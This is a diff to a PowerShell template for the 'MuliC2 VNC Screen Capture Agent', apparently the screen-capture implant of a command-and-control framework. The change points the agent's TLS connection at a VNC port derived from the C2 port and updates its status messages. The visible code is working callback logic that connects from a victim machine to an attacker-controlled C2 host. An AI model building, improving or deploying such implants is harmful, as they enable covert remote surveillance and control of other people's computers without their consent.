@@ -1,6 +1,7 @@
 # MuliC2 VNC Screen Capture Agent - Fixed TLS Version
 # C2 Host: {{C2_HOST}}
 # C2 Port: {{C2_PORT}}
+# VNC Endpoint: /vnc/agent
 # Generated: {{GENERATED_DATE}}
 
 param( [string]$C2Host = "{{C2_HOST}}", [int]$C2Port = {{C2_PORT}} )
@@ -116,7 +117,9 @@ function Connect-ToServer {
     param([int]$timeoutMs = 15000)
     
     try {
-        Write-Host "[*] Connecting to MuliC2 server at ${C2Host}:${C2Port}..." -ForegroundColor Cyan
+        # VNC port is C2 port + 1000 (e.g., if C2 is 8080, VNC is 9080)
+        $vncPort = $C2Port + 1000
+        Write-Host "[*] Connecting to MuliC2 VNC TLS endpoint at ${C2Host}:${vncPort}..." -ForegroundColor Cyan
         
         # Clean up existing connection
         if ($global:sslStream) { 
@@ -139,9 +142,9 @@ function Connect-ToServer {
         $global:tcpClient.ReceiveBufferSize = 65536
         $global:tcpClient.SendBufferSize = 65536
         
-        # Connect with timeout
-        Write-Host "[*] Establishing TCP connection..." -ForegroundColor Yellow
-        $asyncResult = $global:tcpClient.BeginConnect($C2Host, $C2Port, $null, $null)
+        # Connect with timeout to VNC port
+        Write-Host "[*] Establishing TCP connection to VNC port ${vncPort}..." -ForegroundColor Yellow
+        $asyncResult = $global:tcpClient.BeginConnect($C2Host, $vncPort, $null, $null)
         $waitSuccess = $asyncResult.AsyncWaitHandle.WaitOne($timeoutMs, $false)
         
         if (-not $waitSuccess) {
@@ -208,14 +211,14 @@ function Connect-ToServer {
                 [System.Security.Authentication.SslProtocols]::Tls12 -bor [System.Security.Authentication.SslProtocols]::Tls13,
                 $false
             )
-            Write-Host "[+] TLS handshake completed successfully" -ForegroundColor Green
+            Write-Host "[+] VNC TLS handshake completed successfully" -ForegroundColor Green
         } catch {
-            Write-Host "[!] TLS handshake failed with error: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "[!] VNC TLS handshake failed with error: $($_.Exception.Message)" -ForegroundColor Red
             Write-Host "[!] Exception type: $($_.Exception.GetType().Name)" -ForegroundColor Red
             if ($_.Exception.InnerException) {
                 Write-Host "[!] Inner exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
             }
-            throw "TLS handshake failed - cannot establish secure connection"
+            throw "VNC TLS handshake failed - cannot establish secure connection"
         }
         
         # Verify TLS connection
